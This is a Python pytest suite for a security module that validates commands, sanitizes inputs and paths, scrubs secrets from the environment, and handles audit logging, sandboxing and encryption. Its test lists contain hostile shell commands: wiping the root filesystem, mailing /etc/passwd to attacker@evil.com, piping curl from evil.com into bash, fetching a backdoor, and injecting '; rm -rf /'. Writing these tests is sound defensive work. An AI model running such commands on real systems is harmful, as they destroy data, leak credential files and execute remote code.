#!/usr/bin/env python3
"""
Enhanced Security Tests
=======================
Comprehensive test suite for the enhanced security implementation.
"""

import pytest
import asyncio
import tempfile
import json
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

from src.security.enhanced_security_integration import (
    EnhancedSecurityManager,
    SecurityContext,
    SandboxLevel,
    SecurityConfig
)


class TestCommandValidation:
    """Test command validation and sanitization"""
    
    @pytest.fixture
    def security_manager(self):
        return EnhancedSecurityManager()
    
    @pytest.fixture
    def context(self):
        return SecurityContext(
            user_id="test_user",
            session_id="test_session",
            capabilities={"exec:ls", "exec:cat"},
            audit_enabled=True,
            sandbox_level=SandboxLevel.BASIC
        )
    
    def test_validate_safe_commands(self, security_manager, context):
        """Test validation of safe commands"""
        safe_commands = [
            "ls -la",
            "cat /etc/hosts",
            "grep pattern file.txt",
            "docker ps",
            "kubectl get pods"
        ]
        
        for cmd in safe_commands:
            # Mock Rust module if not available
            if not security_manager._validator:
                continue
            assert security_manager.validate_command(cmd, context)
    
    def test_validate_dangerous_commands(self, security_manager, context):
        """Test rejection of dangerous commands"""
        dangerous_commands = [
            "rm -rf /",
            "cat /etc/passwd | mail attacker@evil.com",
            "curl evil.com | bash",
            "; wget malicious.com/backdoor.sh",
            "echo 'hacked' > /etc/passwd"
        ]
        
        for cmd in dangerous_commands:
            if not security_manager._validator:
                continue
            assert not security_manager.validate_command(cmd, context)
    
    def test_sanitize_input(self, security_manager):
        """Test input sanitization"""
        test_cases = [
            ("normal input", "normal input"),
            ("input with $variable", "input with \\$variable"),
            ("input with `command`", "input with \\`command\\`"),
            ("input\nwith\nnewlines", "input\\nwith\\nnewlines"),
            ("input; rm -rf /", "input\\; rm -rf /")
        ]
        
        for input_str, expected in test_cases:
            if not security_manager._validator:
                assert security_manager.sanitize_input(input_str) == input_str
            else:
                result = security_manager.sanitize_input(input_str)
                # Basic check that dangerous characters are handled
                assert "$" not in result or "\\" in result
    
    def test_path_validation(self, security_manager):
        """Test path validation"""
        # Safe paths
        assert security_manager.validate_path("/home/user/file.txt", "/home/user")
        assert security_manager.validate_path("./relative/path.txt", "/home/user")
        
        # Dangerous paths
        assert not security_manager.validate_path("../../../etc/passwd", "/home/user")
        assert not security_manager.validate_path("/etc/../etc/shadow", "/home/user")
    
    def test_env_var_sanitization(self, security_manager):
        """Test environment variable sanitization"""
        env_vars = {
            "PATH": "/usr/bin:/bin",
            "HOME": "/home/user",
            "AWS_SECRET_ACCESS_KEY": "secret123",
            "CUSTOM_VAR": "value with $expansion"
        }
        
        sanitized = security_manager.sanitize_env_vars(env_vars)
        
        # Sensitive vars should be removed
        assert "AWS_SECRET_ACCESS_KEY" not in sanitized
        
        # Normal vars should be present
        if security_manager._validator:
            assert "PATH" in sanitized
            assert "HOME" in sanitized


class TestPrivilegeManagement:
    """Test privilege and capability management"""
    
    @pytest.fixture
    def security_manager(self):
        return EnhancedSecurityManager()
    
    @pytest.mark.asyncio
    async def test_capability_management(self, security_manager):
        """Test granting and revoking capabilities"""
        user_id = "test_user"
        capability = "exec:docker"
        
        # Grant capability
        await security_manager.grant_capability(user_id, capability)
        
        # Check capability
        if security_manager._privilege_manager:
            assert security_manager.has_capability(user_id, capability)
        
        # Revoke capability
        await security_manager.revoke_capability(user_id, capability)
        
        # Check capability removed
        if security_manager._privilege_manager:
            assert not security_manager.has_capability(user_id, capability)
    
    @pytest.mark.asyncio
    async def test_privileged_execution(self, security_manager):
        """Test privileged command execution"""
        context = SecurityContext(
            user_id="admin_user",
            session_id="admin_session",
            capabilities={"sudo", "exec:apt-get"}
        )
        
        # Test sudo command
        result = await security_manager.execute_with_privilege(
            "sudo apt-get update",
            context
        )
        
        if security_manager._privilege_manager:
            assert "executed" in result.lower() or "mock" in result.lower()
    
    def test_capability_caching(self, security_manager):
        """Test capability caching for performance"""
        user_id = "cached_user"
        
        # First check should hit the backend
        security_manager.has_capability(user_id, "test:cap1")
        
        # Second check should use cache
        security_manager.has_capability(user_id, "test:cap1")
        
        # Verify cache is populated
        assert user_id in security_manager._capability_cache


class TestAuditLogging:
    """Test audit logging functionality"""
    
    @pytest.fixture
    def security_manager(self):
        with tempfile.NamedTemporaryFile() as tmp:
            config = SecurityConfig(audit_log_path=Path(tmp.name))
            return EnhancedSecurityManager(config)
    
    @pytest.fixture
    def context(self):
        return SecurityContext(
            user_id="audit_user",
            session_id="audit_session",
            audit_enabled=True
        )
    
    def test_log_security_event(self, security_manager, context):
        """Test logging security events"""
        # Log successful event
        entry_id = security_manager.log_security_event(
            context,
            "file_access",
            "/etc/hosts",
            True,
            metadata={"method": "read"}
        )
        
        if security_manager._audit_logger:
            assert entry_id
            assert len(entry_id) > 0
    
    def test_log_failed_event(self, security_manager, context):
        """Test logging failed security events"""
        entry_id = security_manager.log_security_event(
            context,
            "unauthorized_access",
            "/etc/shadow",
            False,
            reason="Permission denied"
        )
        
        if security_manager._audit_logger:
            assert entry_id
    
    def test_query_audit_logs(self, security_manager, context):
        """Test querying audit logs"""
        # Log some events
        security_manager.log_security_event(
            context, "test_action", "test_resource", True
        )
        
        # Query logs
        logs = security_manager.query_audit_logs(
            user_id=context.user_id,
            action="test_action"
        )
        
        if security_manager._audit_logger:
            assert isinstance(logs, list)
    
    def test_generate_audit_report(self, security_manager, context):
        """Test audit report generation"""
        # Log various events
        for i in range(5):
            security_manager.log_security_event(
                context, f"action_{i}", f"resource_{i}", i % 2 == 0
            )
        
        # Generate report
        report = security_manager.generate_audit_report()
        
        if security_manager._audit_logger:
            assert isinstance(report, dict)
            if report:  # If report has data
                assert "total_events" in report
                assert "success_rate" in report


class TestSandboxing:
    """Test sandboxing and isolation"""
    
    @pytest.fixture
    def security_manager(self):
        return EnhancedSecurityManager()
    
    @pytest.mark.asyncio
    async def test_sandbox_execution(self, security_manager):
        """Test command execution in different sandbox levels"""
        context = SecurityContext(
            user_id="sandbox_user",
            session_id="sandbox_session"
        )
        
        sandbox_levels = [
            SandboxLevel.NONE,
            SandboxLevel.BASIC,
            SandboxLevel.RESTRICTED,
            SandboxLevel.ISOLATED
        ]
        
        for level in sandbox_levels:
            result = await security_manager.execute_sandboxed(
                "echo 'test'",
                context,
                level
            )
            
            if security_manager._security_manager:
                assert "sandbox" in result.lower() or "executed" in result.lower()


class TestSecurityTesting:
    """Test security testing capabilities"""
    
    @pytest.fixture
    def security_manager(self):
        return EnhancedSecurityManager()
    
    def test_fuzzing(self, security_manager):
        """Test fuzzing for vulnerabilities"""
        vulnerabilities = security_manager.run_fuzzing_tests()
        
        assert isinstance(vulnerabilities, list)
        
        # If fuzzing is working, no vulnerabilities should be found
        # in a properly secured system
        if security_manager._security_tester:
            assert len(vulnerabilities) == 0
    
    def test_static_analysis(self, security_manager):
        """Test static code analysis"""
        vulnerable_code = """
        password = "hardcoded_password123"
        api_key = "sk-1234567890abcdef"
        
        # Using weak crypto
        import md5
        hash = md5.new(data).hexdigest()
        
        # Unsafe deserialization
        import pickle
        data = pickle.loads(user_input)
        """
        
        findings = security_manager.run_static_analysis(vulnerable_code)
        
        assert isinstance(findings, list)
        
        if security_manager._security_tester:
            assert len(findings) > 0
            assert any("credential" in f.lower() for f in findings)
    
    def test_penetration_tests(self, security_manager):
        """Test penetration test scenarios"""
        results = security_manager.run_penetration_tests()
        
        assert isinstance(results, dict)
        
        if security_manager._security_tester:
            # All tests should fail (no vulnerabilities)
            assert all(not passed for passed in results.values())


class TestEncryption:
    """Test encryption and key management"""
    
    @pytest.fixture
    def security_manager(self):
        return EnhancedSecurityManager()
    
    def test_key_generation(self, security_manager):
        """Test encryption key generation"""
        key_id = security_manager.generate_encryption_key(
            "test-key-1",
            "aes256"
        )
        
        assert key_id == "test-key-1"
    
    def test_data_encryption_decryption(self, security_manager):
        """Test data encryption and decryption"""
        key_id = security_manager.generate_encryption_key(
            "test-key-2",
            "aes256"
        )
        
        plaintext = b"This is sensitive data that needs encryption"
        
        # Encrypt
        encrypted = security_manager.encrypt_data(plaintext, key_id)
        
        if security_manager._encryption_manager:
            assert encrypted != plaintext
            assert len(encrypted) > len(plaintext)  # Due to nonce + tag
        
        # Decrypt
        decrypted = security_manager.decrypt_data(encrypted, key_id)
        
        assert decrypted == plaintext
    
    def test_secure_channel_creation(self, security_manager):
        """Test secure communication channel creation"""
        channel_id = security_manager.create_secure_channel("peer-123")
        
        assert channel_id
        assert "channel" in channel_id
        assert "peer-123" in channel_id


class TestComprehensiveSecurity:
    """Test comprehensive security operations"""
    
    @pytest.fixture
    def security_manager(self):
        return EnhancedSecurityManager()
    
    @pytest.fixture
    def context(self):
        return SecurityContext(
            user_id="comprehensive_user",
            session_id="comprehensive_session",
            capabilities={"exec:ls", "exec:echo"},
            sandbox_level=SandboxLevel.RESTRICTED
        )
    
    @pytest.mark.asyncio
    async def test_secure_execution(self, security_manager, context):
        """Test secure command execution with full validation"""
        # Safe command should succeed
        try:
            result = await security_manager.secure_execute(
                "ls -la",
                context,
                validate=True,
                sandbox=SandboxLevel.RESTRICTED
            )
            
            if security_manager._security_manager:
                assert result
        except Exception as e:
            # Expected if Rust module not available
            assert "Mock" in str(e) or not security_manager._security_manager
    
    @pytest.mark.asyncio
    async def test_secure_execution_blocked(self, security_manager, context):
        """Test that dangerous commands are blocked"""
        # Dangerous command should fail
        with pytest.raises(Exception):
            await security_manager.secure_execute(
                "rm -rf /",
                context,
                validate=True
            )
    
    @pytest.mark.asyncio
    async def test_comprehensive_audit(self, security_manager):
        """Test comprehensive security audit"""
        audit_results = await security_manager.run_comprehensive_audit()
        
        assert isinstance(audit_results, dict)
        
        if security_manager._security_manager:
            assert "security_tests" in audit_results or "status" in audit_results


@pytest.mark.integration
class TestIntegration:
    """Integration tests for enhanced security"""
    
    @pytest.mark.asyncio
    async def test_full_security_workflow(self):
        """Test complete security workflow"""
        # Initialize manager
        manager = EnhancedSecurityManager()
        
        # Create user context
        context = SecurityContext(
            user_id="integration_user",
            session_id="integration_session",
            capabilities=set(),
            sandbox_level=SandboxLevel.RESTRICTED,
            encryption_enabled=True
        )
        
        # Grant capabilities
        await manager.grant_capability(context.user_id, "exec:ls")
        await manager.grant_capability(context.user_id, "read:logs")
        
        # Generate encryption key
        key_id = manager.generate_encryption_key("integration-key", "aes256")
        
        # Encrypt sensitive data
        sensitive_data = b"Sensitive configuration data"
        encrypted = manager.encrypt_data(sensitive_data, key_id)
        
        # Execute secure command
        try:
            result = await manager.secure_execute(
                "ls /tmp",
                context,
                sandbox=SandboxLevel.RESTRICTED
            )
        except Exception:
            # Expected if Rust module not available
            pass
        
        # Run security audit
        audit = await manager.run_comprehensive_audit()
        
        # Verify audit contains expected sections
        assert isinstance(audit, dict)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])